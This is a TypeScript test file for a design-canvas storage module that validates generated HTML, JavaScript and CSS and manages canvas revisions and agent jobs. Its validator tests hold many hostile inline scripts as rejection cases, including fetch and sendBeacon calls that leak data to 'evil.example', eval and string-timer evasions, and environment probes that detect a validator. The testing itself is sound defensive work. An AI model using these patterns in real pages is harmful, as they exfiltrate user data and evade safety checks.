import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { mkdir, mkdtemp, open, readFile, readdir, rm, stat, symlink, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import test from "node:test";
import { stableStringify } from "../src/canonical-json.ts";
import {
  DESIGN_MAIN_AGENT_QUEUED_MESSAGE,
  DesignRevisionConflictError,
  MAX_DESIGN_ASSET_BYTES,
  MAX_DESIGN_CONTEXT_BYTES,
  activateDesignMainSession,
  appendDesignJobActivity,
  appendDesignThreadMessage,
  assertDesignFrozenContextBudget,
  createDesignMainSession,
  deleteDesignMainSession,
  listDesignMainSessions,
  renameDesignMainSession,
  buildPortableDesignVersionHtml,
  cancelDesignJob,
  createDesignJob,
  ensureDesignCanvasAssetBatch,
  getDesignCanvas,
  getDesignJob,
  getDesignJobByIdempotencyKey,
  getDesignJobContext,
  getDesignThread,
  getDesignVersion,
  importDesignCanvasAssetBatch,
  listDesignAssets,
  listDesignJobs,
  listDesignVersions,
  publishDesignVersion,
  recoverInterruptedDesignJobs,
  reserveDesignMainPlanExecution,
  redoDesignCanvas,
  resolveDesignAssetFile,
  resolveDesignVersionFile,
  resolveDesignVersionPreview,
  storeDesignAsset,
  undoDesignCanvas,
  updateDesignJob,
  updateDesignJobToolActivity,
  updateDesignThreadMessage,
  validateDesignExportJavaScript,
  validateDesignExportCss,
  validateDesignHtml,
  initializeDesignProject,
  mutateDesignCanvas,
} from "../src/design/design-storage.ts";
import { materializeDesignContext } from "../src/design/design-node-agent.ts";
import type { DesignVersionPublicationPhase } from "../src/design/design-types.ts";
import type { DesignJobCreationPhase } from "../src/design/design-storage.ts";

const FIXTURE_JOB_IDENTITY = { runnerId: "fixture", model: null } as const;

async function completesBefore<T>(operation: Promise<T>, milliseconds = 2_000): Promise<T> {
  let timeout: NodeJS.Timeout | undefined;
  try {
    return await Promise.race([
      operation,
      new Promise<never>((_resolve, reject) => {
        timeout = setTimeout(
          () => reject(new Error(`Operation did not complete within ${milliseconds}ms`)),
          milliseconds,
        );
      }),
    ]);
  } finally {
    if (timeout !== undefined) clearTimeout(timeout);
  }
}

async function sourceVersionFixture(dataDir: string, projectId: string) {
  await initializeDesignProject(dataDir, projectId);
  await mutateDesignCanvas(dataDir, projectId, {
    expectedRevision: 0,
    intents: [{ type: "add-node", node: { id: "node-source", kind: "component" } }],
  });
  return publishDesignVersion(dataDir, projectId, {
    nodeId: "node-source",
    html: `<!doctype html><html><head></head><body><main>${projectId}</main></body></html>`,
    contextHash: createHash("sha256").update(projectId).digest("hex"),
    canvasRevision: 1,
    expectedHeadVersionId: null,
    jobId: null,
    runnerId: "fixture",
    model: null,
  });
}

async function validatingPublicationFixture(label: string): Promise<{
  dataDir: string;
  projectId: string;
  job: Awaited<ReturnType<typeof createDesignJob>>["job"];
}> {
  const dataDir = await mkdtemp(join(tmpdir(), `dezin-design-publication-${label}-`));
  const projectId = `project-publication-${label}`;
  await initializeDesignProject(dataDir, projectId);
  await mutateDesignCanvas(dataDir, projectId, {
    expectedRevision: 0,
    intents: [{ type: "add-node", node: { id: "node-page", kind: "page" } }],
  });
  const created = await createDesignJob(dataDir, projectId, {
    kind: "node-generation",
    ...FIXTURE_JOB_IDENTITY,
    nodeId: "node-page",
  });
  await updateDesignJob(dataDir, projectId, created.job.id, { status: "running" });
  await updateDesignJob(dataDir, projectId, created.job.id, { status: "validating" });
  return { dataDir, projectId, job: created.job };
}

test("Design HTML validation ignores inert navigation words in inline-script comments", () => {
  assert.doesNotThrow(() => validateDesignHtml(`<!doctype html><html><head></head><body><script>
    // TOC smooth scroll offset handled by scroll-padding-top; ensure keyboard focus moves
    document.body.dataset.ready = "yes";
  </script></body></html>`));
});

test("Design HTML validation allows locally bound navigation names and ordinary object properties", () => {
  assert.doesNotThrow(() => validateDesignHtml(`<!doctype html><html><head></head><body><script>
    const parent = { top: 12, opener: "local" };
    const top = parent.top;
    function describe(opener) { return opener + top; }
    document.body.dataset.value = describe(parent.opener);
  </script></body></html>`));
});

test("Design HTML validation allows inert URL and capability text in inline JavaScript", () => {
  assert.doesNotThrow(() => validateDesignHtml(`<!doctype html><html><head></head><body><script>
    const copy = "Parent/top/opener notes: https://example.test/reference and /api/examples";
    document.body.textContent = copy;
  </script></body></html>`));
});

test("Design HTML validation allows passive data images but rejects active data MIME types", () => {
  assert.doesNotThrow(() => validateDesignHtml(`<!doctype html><html><head><style>
    body { background-image: url("data:image/png;base64,iVBORw0KGgo="); }
  </style></head><body></body></html>`));

  for (const url of [
    "data:text/html,<script>alert(1)</script>",
    "data:application/xhtml+xml,<html></html>",
    "data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'></svg>",
    "data:application/xml,<root/>",
    "data:application/atom+xml,<feed/>",
    "data:application/pdf;base64,JVBERi0xLjQ=",
  ]) {
    assert.throws(
      () => validateDesignHtml(`<!doctype html><html><head></head><body><img src="${url}"></body></html>`),
      /active|unsafe|data|media type|unpinned|external/i,
      url,
    );
  }
});

test("Design HTML validation rejects active global navigation and remote capabilities", () => {
  const unsafeScripts = [
    "parent.postMessage('escape', '*')",
    "{ const top = 12; } top.location = '#escape'",
    "opener.close()",
    "fetch('https://evil.example/data')",
    "const remote = 'https://evil.example/image.png'; document.body.setAttribute('src', remote)",
    "window.location.assign('https://evil.example')",
    "window.open('https://evil.example')",
    "import('https://evil.example/module.js')",
    "const broken = ;",
  ];
  for (const script of unsafeScripts) {
    assert.throws(
      () => validateDesignHtml(`<!doctype html><html><head></head><body><script>${script}</script></body></html>`),
      /invalid|parent|top|opener|navigation|window|remote/i,
      script,
    );
  }
  assert.throws(
    () => validateDesignHtml("<!doctype html><html><body><script>\nconst broken = ;\n</script></body></html>"),
    /inline JavaScript is invalid.*2:\d+.*const broken/s,
  );
});

test("Design HTML validation rejects network capabilities recovered from unknown receivers", () => {
  const unsafeScripts = [
    `window.addEventListener("click", (event) => event.view.fetch("https://evil.example/leak"))`,
    `function leak(receiver) { receiver.fetch("https://evil.example/leak"); }
     document.addEventListener("click", leak)`,
    `function leak(receiver) { receiver.fetch?.("https://evil.example/leak"); }
     document.addEventListener("click", leak)`,
    `window.addEventListener("click", (event) => {
       const request = event.view.fetch;
       request("https://evil.example/leak");
     })`,
    `function leak(receiver) { receiver["send" + "Beacon"]("https://evil.example/leak", "secret"); }
     document.addEventListener("click", leak)`,
  ];
  for (const script of unsafeScripts) {
    assert.throws(
      () => validateDesignHtml(`<!doctype html><html><head></head><body><script>${script}</script></body></html>`),
      /remote|network/i,
      script,
    );
  }

  assert.doesNotThrow(() => validateDesignHtml(`<!doctype html><html><head></head><body><script>
    const localClient = { fetch(value) { return value; }, sendBeacon(value) { return value; } };
    localClient.fetch("local-state");
    localClient.sendBeacon("local-state");
  </script></body></html>`));
});

test("Design HTML validation rejects aliased and indirect browser capabilities", () => {
  const unsafeScripts = [
    "const { fetch: request } = window; request('https://evil.example/x')",
    "eval('fetch(\"https://evil.example/x\")')",
    "const image = document.createElement('img'); image.setAttribute(['s', 'rc'].join(''), 'https://evil.example/x')",
    "navigator.sendBeacon('https://evil.example/x', 'secret')",
    "const popup = window.open; popup('https://evil.example/x')",
    "history.pushState({}, '', 'https://evil.example/x')",
    "const image = document.createElement('img'); Object.assign(image, { src: 'https://evil.example/x' })",
    "Reflect.set(document.body, 'innerHTML', '<img src=\"https://evil.example/x\">')",
    "document.body.insertAdjacentHTML('beforeend', '<img src=\"https://evil.example/x\">')",
    "setTimeout('fetch(\"https://evil.example/x\")', 0)",
    "window.setTimeout('fetch(\"https://evil.example/x\")', 0)",
    "let delayed = 'fetch(\"https://evil.example/x\")'; setTimeout(delayed, 0)",
    "[].filter.constructor('fetch(\"https://evil.example/x\")')()",
    "this.fetch('https://evil.example/x')",
    "this.parent.postMessage('escape', '*')",
    "this.top.location = '#escape'",
    "this.eval('fetch(\"https://evil.example/x\")')",
    "const script = document.createElement('script'); script.textContent = 'fetch(\"https://evil.example/x\")'; document.body.append(script)",
    "const tag = 'scr' + 'ipt'; document.createElement(tag)",
    "document.body.style.backgroundImage = 'u\\\\72l(https://evil.example/x)'",
    "document.body.style.cssText = 'background: image-set(\"//evil.example/x\" 1x)'",
    "document.body.style.setProperty('background-image', 'url(https://evil.example/x)')",
    "document.styleSheets[0].insertRule('@import \"https://evil.example/x\"')",
    "document.createElement('a').target = '_blank'",
    "const global = window.window; global.fetch('https://evil.example/x')",
    "const global = document.body.ownerDocument.defaultView; global.fetch('https://evil.example/x')",
  ];
  for (const script of unsafeScripts) {
    assert.throws(
      () => validateDesignHtml(`<!doctype html><html><head></head><body><script>${script}</script></body></html>`),
      /invalid|navigation|window|parent|top|opener|remote|dynamic|markup|style|asset|external|unpinned/i,
      script,
    );
  }
});

test("Design HTML validation models parameter and class-static var scopes", () => {
  const unsafeScripts = [
    "function load(value = fetch('https://evil.example/x')) { var fetch = () => undefined; return value; } load();",
    "class Local { static { var fetch = () => undefined; } } fetch('https://evil.example/x');",
  ];
  for (const script of unsafeScripts) {
    assert.throws(
      () => validateDesignHtml(`<!doctype html><html><head></head><body><script>${script}</script></body></html>`),
      /remote/i,
      script,
    );
  }
});

test("Design HTML validation allows read-only capability checks and locally bound names", () => {
  assert.doesNotThrow(() => validateDesignHtml(`<!doctype html><html><head></head><body><script>
    const supportsFetch = typeof fetch === "function";
    const currentRoute = location.pathname + window.location.hash;
    function render(fetch, history, Function) {
      history.pushState({}, "", "local");
      return Function(fetch());
    }
    function refresh() { document.body.dataset.refreshed = "yes"; }
    setTimeout(refresh, 0);
    window.setTimeout(() => document.body.dataset.later = "yes", 0);
    document.body.dataset.summary = String(supportsFetch) + currentRoute + typeof render;
  </script></body></html>`));
});

test("Design HTML validation accepts stable callable timer callbacks and rejects reassigned callbacks", () => {
  assert.doesNotThrow(() => validateDesignHtml(`<!doctype html><html><head></head><body><script>
    let refresh = () => { document.body.dataset.refreshed = "yes"; };
    var tick = function () { document.body.dataset.ticked = "yes"; };
    const controller = { settle() { document.body.dataset.settled = "yes"; } };
    setTimeout(refresh, 0);
    window.setInterval(tick, 1000);
    setTimeout(controller.settle, 0);
  </script></body></html>`));

  assert.throws(
    () => validateDesignHtml(`<!doctype html><html><head></head><body><script>
      let callback = () => undefined;
      callback = "not callable";
      setTimeout(callback, 0);
    </script></body></html>`),
    /dynamic/i,
  );
});

test("Design Export JavaScript rejects deferred timers and schedulers without changing Node HTML", () => {
  const deferredScripts = [
    "setTimeout(() => document.body.replaceChildren(), 1)",
    "window.setInterval(() => document.body.replaceChildren(), 1)",
    "requestAnimationFrame(() => document.body.replaceChildren())",
    "globalThis.requestIdleCallback?.(() => document.body.replaceChildren())",
    "queueMicrotask(() => document.body.replaceChildren())",
  ];

  for (const script of deferredScripts) {
    assert.throws(
      () => validateDesignExportJavaScript(script),
      /timer|scheduler|deferred/i,
      script,
    );
  }

  assert.doesNotThrow(() => validateDesignExportJavaScript(`
    const localClock = { setTimeout(callback) { callback(); } };
    let ready = false;
    localClock.setTimeout(() => { ready = true; });
    document.body.dataset.ready = String(ready);
  `));

  assert.doesNotThrow(() => validateDesignHtml(`<!doctype html><html><head></head><body><script>
    requestAnimationFrame(() => document.body.dataset.ready = "yes");
  </script></body></html>`));
});

test("Design Export validation rejects browser-state probes and Web Animations", () => {
  const unsafeScripts = [
    "if (navigator.webdriver) document.body.textContent = 'validation-only'",
    "if (window.name) document.body.textContent = window.name",
    "if (screen.width > 0) document.body.dataset.gate = 'screen'",
    "document.body.dataset.dpr = String(devicePixelRatio)",
    "if (matchMedia('(display-mode: browser)').matches) document.body.dataset.gate = 'media'",
    "const prior = localStorage.getItem('visited'); document.body.dataset.prior = String(prior)",
    "window.sessionStorage.setItem('visited', 'yes')",
    "indexedDB.open('visual-gate')",
    "globalThis.caches.match('/validation-state')",
    "document.cookie = 'gate=seen'",
    "Reflect.get(window, 'navigator').webdriver",
    "Object.getOwnPropertyDescriptor(window, 'localStorage')?.get?.call(window)",
    "document.body.animate([{ opacity: 0 }, { opacity: 1 }], { delay: 60_000 })",
    "new KeyframeEffect(document.body, [{ opacity: 0 }, { opacity: 1 }])",
    "document.createElementNS('http://www.w3.org/2000/svg', 'animate')",
    "document.createElementNS('http://www.w3.org/2000/svg', 'set')",
    "document.body.style.setProperty('animation', 'swap 1ms 60s forwards')",
    "document.body.style.cssText = 'transition: opacity 1ms 60s'",
    "document.styleSheets[0]?.insertRule('@keyframes swap { to { opacity: 0 } }')",
    "document.body.setAttribute('style', unknownCss)",
    "document.body.style.setProperty('color', unknownColor)",
    "document.styleSheets[0]?.insertRule(unknownRule)",
  ];
  for (const script of unsafeScripts) {
    assert.throws(
      () => validateDesignExportJavaScript(script),
      /environment|storage|animation|deferred/i,
      script,
    );
  }

  assert.doesNotThrow(() => validateDesignExportJavaScript(`
    const localState = { navigator: "copy", localStorage: new Map(), animate(value) { return value; } };
    document.body.dataset.copy = localState.navigator;
  `));
});

test("Design Export state validation permits local presentation-record destructuring without weakening global probes", () => {
  const localPresentationRecords = [
    `const swatches = [{ name: "Ink", value: "#111" }];
     for (const { name, value } of swatches) {
       const row = document.createElement("div");
       row.textContent = name + value;
       document.body.append(row);
     }`,
    `const swatches = [{ name: "Ink", value: "#111" }];
     swatches.forEach(({ name, value }) => {
       const row = document.createElement("div");
       row.textContent = name + value;
       document.body.append(row);
     });`,
    `const swatches = [{ name: "Ink", value: "#111" }];
     for (const swatch of swatches) {
       const row = document.createElement("div");
       row.textContent = swatch.name + swatch.value;
       document.body.append(row);
     }`,
    `const swatches = [{ name: "Ink" }];
     swatches.forEach((swatch) => {
       const row = document.createElement("div");
       row.textContent = swatch.name;
       document.body.append(row);
     });`,
  ];
  for (const source of localPresentationRecords) {
    assert.doesNotThrow(() => validateDesignExportJavaScript(source), source);
  }

  for (const source of [
    `const { name } = window; document.body.textContent = name;`,
    `const { localStorage } = globalThis; document.body.textContent = String(localStorage.length);`,
  ]) {
    assert.throws(() => validateDesignExportJavaScript(source), /remote|environment|storage/i, source);
  }
});

test("Design Export proves finite local values for URL-capable style properties", () => {
  assert.doesNotThrow(() => validateDesignExportJavaScript(`
    function swatch(background: string): HTMLElement {
      const element = document.createElement("span");
      element.style.background = background;
      return element;
    }
    document.body.append(swatch("#1a1a1a"), swatch("linear-gradient(#fff, #eee)"));
  `));

  assert.throws(() => validateDesignExportJavaScript(`
    function swatch(background: string): HTMLElement {
      const element = document.createElement("span");
      element.style.background = background;
      return element;
    }
    document.body.append(swatch("url(https://evil.example/tracker.png)"));
  `), /remote|unpinned/i);
  assert.throws(() => validateDesignExportJavaScript(`
    const element = document.createElement("span");
    element.style.background = unknownExternalState;
  `), /assignment to background at 3:5/i);
});

test("Design Export CSS rejects animations, transitions, and timeline-delayed changes", () => {
  const unsafeCss = [
    ".gate { animation: swap 1ms 60s forwards } @keyframes swap { to { opacity: 0 } }",
    ".gate { transition-property: opacity; transition-delay: 60s }",
    ".gate { \\61nimation-name: swap }",
    ".gate { view-timeline-name: --gate }",
    "@starting-style { .gate { opacity: 0 } }",
  ];
  for (const css of unsafeCss) {
    assert.throws(
      () => validateDesignExportCss(css),
      /animation|transition|timeline|deferred/i,
      css,
    );
  }

  assert.doesNotThrow(() => validateDesignExportCss(`
    .static-card { opacity: 1; transform: translateX(0); }
    .static-card::before { content: "animation: prose only"; }
  `));
});

test("Design Export capability scanning ignores TypeScript type-space but keeps runtime casts active", () => {
  assert.doesNotThrow(() => validateDesignExportJavaScript(`
    type Swatch = { name: string; performance?: string };
    const swatch: Swatch = { name: "Ink" };
    document.body.textContent = swatch.name;
  `));
  assert.throws(() => validateDesignExportJavaScript(`
    document.body.textContent = (navigator as unknown as { name: string }).name;
  `), /remote|environment|storage/i);
});

test("Design Export proves finite local URL loops and invalidates mutated collections", () => {
  for (const source of [
    `const links: Array<[string, string]> = [["One", "#one"], ["Two", "/two"]];
     for (const [label, href] of links) {
       const anchor = document.createElement("a");
       anchor.href = href;
       anchor.textContent = label;
       document.body.append(anchor);
     }`,
    `for (const [label, href] of [["One", "#one"], ["Two", "/two"]] as Array<[string, string]>) {
       const anchor = document.createElement("a");
       anchor.href = href;
       anchor.textContent = label;
       document.body.append(anchor);
     }`,
    `function appendLinks(links: Array<[string, string]>): void {
       for (const [label, href] of links) {
         const anchor = document.createElement("a");
         anchor.href = href;
         anchor.textContent = label;
         document.body.append(anchor);
       }
     }
     appendLinks([["One", "#one"], ["Two", "/two"]]);`,
    `type Story = { href: string; title: string };
     const stories: Story[] = [{ href: "#one", title: "One" }, { href: "/two", title: "Two" }];
     for (const story of stories.slice(0, 2)) {
       const anchor = document.createElement("a");
       anchor.href = story.href;
       anchor.textContent = story.title;
       document.body.append(anchor);
     }`,
    `const notes = ["Label — detail"];
     for (const note of notes) document.body.append(note.split(" — ")[0]!);`,
  ]) {
    assert.doesNotThrow(() => validateDesignExportJavaScript(source), source);
  }

  for (const source of [
    `const links: Array<[string, string]> = [["Bad", "https://evil.example/x"]];
     for (const [, href] of links) document.createElement("a").href = href;`,
    `const links: Array<[string, string]> = [["One", "#one"]];
     links.push(["Bad", "https://evil.example/x"]);
     for (const [, href] of links) document.createElement("a").href = href;`,
    `type Story = { href: string };
     const stories: Story[] = [{ href: "#one" }, { href: "https://evil.example/x" }];
     for (const story of stories.slice(0, 2)) document.createElement("a").href = story.href;`,
  ]) {
    assert.throws(() => validateDesignExportJavaScript(source), /remote/i, source);
  }
});

test("Design Export preserves stable provenance through minified var and let syntax", () => {
  assert.doesNotThrow(() => validateDesignExportJavaScript(`
    var storyHref = "#stories";
    var swatches = [{ name: "Ink", hex: "#111" }, { name: "Paper", hex: "#fff" }];
    for (let swatch of swatches) {
      const anchor = document.createElement("a");
      anchor.href = storyHref;
      anchor.textContent = swatch.name + swatch.hex;
      document.body.append(anchor);
    }
  `));

  for (const source of [
    `var storyHref = "#stories"; storyHref = "https://evil.example/x";
     document.createElement("a").href = storyHref;`,
    `var storyHref = "https://evil.example/x"; document.createElement("a").href = storyHref;
     var storyHref = "#stories";`,
    `var swatches = [{ name: "Ink" }];
     for (let swatch of swatches) { swatch = window; document.body.textContent = swatch.name; }`,
    `const state = {}; Object.assign(state, unknownExternalState);`,
  ]) {
    assert.throws(() => validateDesignExportJavaScript(source), /remote|environment|storage/i, source);
  }
});

test("Design Export rejects generic DOM factories whose tag and attribute names are not statically bounded", () => {
  assert.throws(() => validateDesignExportJavaScript(`
    function el(tag: string, attrs: Record<string, string>): HTMLElement {
      const node = document.createElement(tag);
      for (const key in attrs) node.setAttribute(key, attrs[key]!);
      return node;
    }
    document.body.append(el("main", { class: "shell" }));
  `), /markup|remote/i);

  assert.doesNotThrow(() => validateDesignExportJavaScript(`
    const node = document.createElement("main");
    node.setAttribute("class", "shell");
    document.body.append(node);
  `));

  assert.throws(
    () => validateDesignExportJavaScript(`document.createElement("scr" + "ipt");`),
    /markup.*call to createElement.*\d+:\d+/is,
  );
});

test("Design HTML validation permits only self-targeting indirect DOM writes", () => {
  assert.doesNotThrow(() => validateDesignHtml(`<!doctype html><html><head></head><body><script>
    const link = document.createElement("a");
    const submit = document.createElement("button");
    Reflect.set(link, "target", "_self");
    Object.defineProperty(submit, "formTarget", { value: "_self" });
    Object.assign(link, { target: "_self" });
  </script></body></html>`));

  const unsafeScripts = [
    `const link = document.createElement("a"); Reflect.set(link, "target", "named-context");`,
    `const link = document.createElement("a"); Object.defineProperty(link, "target", { value: "named-context" });`,
    `const submit = document.createElement("button"); Object.assign(submit, { formTarget: "named-context" });`,
  ];
  for (const script of unsafeScripts) {
    assert.throws(
      () => validateDesignHtml(`<!doctype html><html><head></head><body><script>${script}</script></body></html>`),
      /window/i,
      script,
    );
  }
});

test("Design HTML validation keeps ordinary local state and typed DOM updates usable", () => {
  assert.doesNotThrow(() => validateDesignHtml(`<!doctype html><html><head></head><body><script>
    const state = { count: 0 };
    const key = "count";
    const patch = { ready: true };
    state[key] = 1;
    Object.assign(state, patch);
    const localWriter = { write(value) { state.value = value; } };
    localWriter.write("safe");
    const localAttributes = { setAttribute(name, value) { state[name] = value; } };
    localAttributes.setAttribute(key, "safe");
    const tagName = "div";
    const node = document.createElement(tagName);
    const ariaName = "aria-live";
    node.setAttribute(ariaName, "polite");
    node.style.setProperty("opacity", "0.5");
    document.body.append(node);
  </script></body></html>`));
});

test("Design HTML validation proves local helper parameters and class receivers without trusting DOM receivers", () => {
  assert.doesNotThrow(() => validateDesignHtml(`<!doctype html><html><head></head><body><script>
    function updateLocalState(state, key, value) { state[key] = value; }
    updateLocalState({ count: 0 }, "count", 1);
    class Store {
      constructor() { this.state = {}; }
      update(key, value) { this.state[key] = value; }
    }
    const store = new Store();
    store.update("ready", true);
  </script></body></html>`));

  const unsafeScripts = [
    `function update(receiver, key, value) { receiver[key] = value; }
     update(document.body, "innerHTML", "<strong>replace</strong>");`,
    `class Store { update(key, value) { this[key] = value; } }
     const store = new Store();
     store.update.call(document.body, "innerHTML", "<strong>replace</strong>");`,
  ];
  for (const script of unsafeScripts) {
    assert.throws(
      () => validateDesignHtml(`<!doctype html><html><head></head><body><script>${script}</script></body></html>`),
      /remote|markup/i,
      script,
    );
  }
});

test("Design HTML validation tokenizes script elements and ignores inert data blocks", () => {
  assert.doesNotThrow(() => validateDesignHtml(`<!doctype html><html><head>
    <script type="application/ld+json">{"name":"A > B"}</script>
    <script type="text/plain">not valid = JavaScript > still inert</script>
  </head><body><script data-note="1 > 0">
    document.body.dataset.ready = "yes";
  </script></body></html>`));
  assert.throws(
    () => validateDesignHtml(`<!doctype html><html><head><script type="application/json">{broken</script></head><body></body></html>`),
    /JSON|data/i,
  );
});

test("Design HTML validation rejects executable HTML attributes and nested browsing contexts", () => {
  const unsafeDocuments = [
    `<!doctype html><html><head></head><body onload="fetch('https://evil.example/x')"></body></html>`,
    `<!doctype html><html><head><script type="speculationrules">{"prefetch":[{"urls":["https://evil.example/x"]}]}</script></head><body></body></html>`,
    `<!doctype html><html><head></head><body><iframe srcdoc="<script>fetch('https://evil.example/x')</script>"></iframe></body></html>`,
    `<!doctype html><html><head></head><body><a href="#safe" target="_blank">Open</a></body></html>`,
    `<!doctype html><html><head></head><body><form><button formtarget="named-window">Send</button></form></body></html>`,
    `<!doctype html><html><head><style>body{background:u\\72l(https://evil.example/x)}</style></head><body></body></html>`,
    `<!doctype html><html><head><style>body{background:image-set("//evil.example/x" 1x)}</style></head><body></body></html>`,
  ];
  for (const html of unsafeDocuments) {
    assert.throws(() => validateDesignHtml(html), /event|script|browsing|remote|invalid|style|asset|external|unpinned/i, html);
  }
});

test("a Design project starts as an empty revisioned canvas and mutations use CAS", async () => {
  const dataDir = await mkdtemp(join(tmpdir(), "dezin-design-storage-"));
  const projectId = "project-one";
  try {
    const initialized = await initializeDesignProject(dataDir, projectId, 100);
    assert.equal(initialized.revision, 0);
    assert.deepEqual(initialized.nodes, []);
    assert.deepEqual(initialized.viewport, { x: 0, y: 0, zoom: 1 });

    const added = await mutateDesignCanvas(dataDir, projectId, {
      expectedRevision: 0,
      intents: [{
        type: "add-node",
        node: {
          id: "node-page",
          kind: "page",
          name: "Home",
          geometry: { x: 120, y: 80, width: 640, height: 480 },
        },
      }],
    }, 110);
    assert.equal(added.revision, 1);
    assert.equal(added.nodes[0]?.state, "empty");
    assert.equal(added.nodes[0]?.name, "Home");

    await assert.rejects(
      mutateDesignCanvas(dataDir, projectId, {
        expectedRevision: 0,
        intents: [{ type: "remove-node", nodeId: "node-page" }],
      }),
      DesignRevisionConflictError,
    );

    const reloaded = await getDesignCanvas(dataDir, projectId);
    assert.equal(reloaded.revision, 1);
    assert.equal(reloaded.nodes[0]?.id, "node-page");
    const projectJson = JSON.parse(await readFile(join(dataDir, "projects", projectId, "design", "project.json"), "utf8"));
    assert.equal(projectJson.schemaVersion, 2);
    assert.equal(projectJson.nodes[0].id, "node-page");
    await assert.rejects(readFile(join(dataDir, "projects", projectId, "design", "nodes", "node-page", "node.json")));
  } finally {
    await rm(dataDir, { recursive: true, force: true, maxRetries: 10, retryDelay: 10 });
  }
});

test("Design storage never lazily converts a legacy Project folder into an empty canvas", async () => {
  const dataDir = await mkdtemp(join(tmpdir(), "dezin-design-no-legacy-"));
  const projectId = "legacy-standard";
  try {
    await mkdir(join(dataDir, "projects", projectId), { recursive: true });
    await writeFile(join(dataDir, "projects", projectId, "package.json"), "{}\n");
    await assert.rejects(getDesignCanvas(dataDir, projectId), /not a Design Canvas project/i);
    await assert.rejects(readFile(join(dataDir, "projects", projectId, "design", "project.json")));
  } finally {
    await rm(dataDir, { recursive: true, force: true });
  }
});

test("restart recovery durably cancels interrupted Jobs without rolling back a good Node head", async () => {
  const dataDir = await mkdtemp(join(tmpdir(), "dezin-design-recovery-"));
  const projectId = "project-recovery";
  try {
    await initializeDesignProject(dataDir, projectId);
    await mutateDesignCanvas(dataDir, projectId, {
      expectedRevision: 0,
      intents: [{ type: "add-node", node: { id: "node-page", kind: "page" } }],
    });
    const good = await publishDesignVersion(dataDir, projectId, {
      nodeId: "node-page",
      html: "<!doctype html><html><head></head><body>Good head</body></html>",
      contextHash: "a".repeat(64),
      canvasRevision: 1,
      expectedHeadVersionId: null,
      jobId: null,
      runnerId: "fixture",
      model: null,
    });
    const created = await createDesignJob(dataDir, projectId, {
      kind: "node-generation",
      ...FIXTURE_JOB_IDENTITY,
      nodeId: "node-page",
    });
    await updateDesignJob(dataDir, projectId, created.job.id, { status: "running" });

    const recovered = await recoverInterruptedDesignJobs(dataDir, projectId, 900);
    assert.deepEqual(recovered.map((job) => job.id), [created.job.id]);
    const job = await getDesignJob(dataDir, projectId, created.job.id);
    assert.equal(job.status, "cancelled");
    assert.match(job.error ?? "", /restart|interrupted/i);
    const node = (await getDesignCanvas(dataDir, projectId)).nodes[0]!;
    assert.equal(node.currentVersionId, good.manifest.id);
    assert.equal(node.selectedVersionId, good.manifest.id);
    assert.equal(node.activeJobId, null);
    assert.equal(node.state, "cancelled");

    assert.deepEqual(await recoverInterruptedDesignJobs(dataDir, projectId, 901), []);
  } finally {
    await rm(dataDir, { recursive: true, force: true });
  }
});

test("restart recovery replaces an interrupted Main Agent reservation in place and is idempotent", async () => {
  const dataDir = await mkdtemp(join(tmpdir(), "dezin-design-main-thread-recovery-"));
  const projectId = "project-main-thread-recovery";
  try {
    await initializeDesignProject(dataDir, projectId);
    const running = await createDesignJob(dataDir, projectId, {
      kind: "main-agent",
      ...FIXTURE_JOB_IDENTITY,
      reserveMainThreadTurn: {
        userContent: "Create the foundation",
        assistantContent: "Main Agent orchestration is queued. The final result will replace this status.",
      },
    }, 100);
    await updateDesignJob(dataDir, projectId, running.job.id, { status: "running" }, 101);
    const before = await getDesignThread(dataDir, projectId, { type: "main" });
    assert.equal(before.messages.length, 2);

    const recovered = await recoverInterruptedDesignJobs(dataDir, projectId, 200);
    assert.deepEqual(recovered.map((job) => job.id), [running.job.id]);
    const after = await getDesignThread(dataDir, projectId, { type: "main" });
    assert.equal(after.messages.length, before.messages.length);
    assert.deepEqual(
      after.messages.filter((message) => message.role === "user").map((message) => message.content),
      ["Create the foundation"],
    );
    for (const jobId of [running.job.id]) {
      const assistant = after.messages.find((message) => message.role === "assistant" && message.jobId === jobId);
      assert.match(assistant?.content ?? "", /interrupted by daemon restart and cancelled/i);
      const job = await getDesignJob(dataDir, projectId, jobId);
      assert.equal(job.status, "cancelled");
      assert.match(job.error ?? "", /interrupted by daemon restart/i);
    }

    assert.deepEqual(await recoverInterruptedDesignJobs(dataDir, projectId, 300), []);
    assert.deepEqual(await getDesignThread(dataDir, projectId, { type: "main" }), after);
  } finally {
    await rm(dataDir, { recursive: true, force: true });
  }
});

test("cancelling a reserved Node turn replaces its assistant marker before returning", async () => {
  const dataDir = await mkdtemp(join(tmpdir(), "dezin-design-node-thread-cancel-"));
  const projectId = "project-node-thread-cancel";
  try {
    await initializeDesignProject(dataDir, projectId);
    await mutateDesignCanvas(dataDir, projectId, {
      expectedRevision: 0,
      intents: [{ type: "add-node", node: { id: "node-page", kind: "page" } }],
    });
    const created = await createDesignJob(dataDir, projectId, {
      kind: "node-generation",
      ...FIXTURE_JOB_IDENTITY,
      nodeId: "node-page",
      reserveThreadTurn: {
        requestContent: "Generate this page",
        assistantContent: DESIGN_MAIN_AGENT_QUEUED_MESSAGE,
      },
    }, 100);
    await updateDesignJob(dataDir, projectId, created.job.id, { status: "running" }, 101);

    const cancelled = await cancelDesignJob(dataDir, projectId, created.job.id, 102);

    assert.equal(cancelled.status, "cancelled");
    const thread = await getDesignThread(dataDir, projectId, { type: "node", nodeId: "node-page" });
    assert.equal(thread.messages.length, 2);
    assert.equal(thread.messages[0]?.content, "Generate this page");
    assert.equal(thread.messages[1]?.content, "Generation cancelled.");
    assert.notEqual(thread.messages[1]?.content, DESIGN_MAIN_AGENT_QUEUED_MESSAGE);
  } finally {
    await rm(dataDir, { recursive: true, force: true });
  }
});

test("fresh Job creation returns both thread reservation ids while idempotent reuse adds no messages", async () => {
  const dataDir = await mkdtemp(join(tmpdir(), "dezin-design-thread-reservation-ids-"));
  const projectId = "project-thread-reservation-ids";
  try {
    await initializeDesignProject(dataDir, projectId);
    await mutateDesignCanvas(dataDir, projectId, {
      expectedRevision: 0,
      intents: [{ type: "add-node", node: { id: "node-page", kind: "page" } }],
    });
    const input = {
      kind: "node-generation" as const,
      ...FIXTURE_JOB_IDENTITY,
      nodeId: "node-page",
      idempotencyKey: "reserve-once",
      promptHash: "a".repeat(64),
      reserveThreadTurn: {
        requestContent: "Generate exactly once",
        assistantContent: DESIGN_MAIN_AGENT_QUEUED_MESSAGE,
      },
    };

    const fresh = await createDesignJob(dataDir, projectId, input, 100);
    assert.equal(fresh.reused, false);
